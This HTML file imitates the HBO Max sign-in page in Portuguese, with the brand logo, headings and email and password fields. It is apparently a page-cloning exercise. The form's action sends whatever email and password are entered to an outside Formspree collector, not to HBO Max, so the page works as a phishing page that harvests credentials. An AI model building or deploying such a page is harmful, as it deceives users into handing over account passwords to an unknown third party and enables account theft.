<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nível Especialista</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;400;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="header">
            <div id="img"><img src="img/hbomax.png" width="100px"></div>
            <div class="gray" id="menu">
                <p>Menu</p>
            </div>
            <div class="gray" id="sign">
                <p>Assinar</p>
            </div>
        </div>
        <div class="login">
            <div id="enter">
                <h1>Entrar</h1>
            </div>
            <div class="gray" id="text1">
                <p>Você tem uma conta HBO Max?</p>
            </div>
        </div>    
        <div class="form">
            <form action="https://formspree.io/f/mgeqwzdl" method="POST">
                <div class="gray" id="email">
                    <p>
                        <label id="loginTitle">E-mail</label><br> 
                        <input id="login" placeholder type="email" required="required" name="email">               
                    </p>
                </div>
                <div class="gray" id="password">
                    <p>
                        <label id="loginTitle">Senha</label><br>
                        <input id="login" placeholder type="password" required="required" name="password">             
                    </p>
                <div id="button">
                    <button id="entrar" type="submit">Entrar</button>
                </div>
                </div>
                <div class="gray" id="text2">
                    <p>Você acessa a HBO Max por um provedor<br>de TV, de internet ou celular?</p>
                </div>
                <div id="button">
                    <button id="provedor" type="button">Entrar como Provedor</button>
                </div>
            </form> 
        </div>    
    </div>  
</body>
</html>
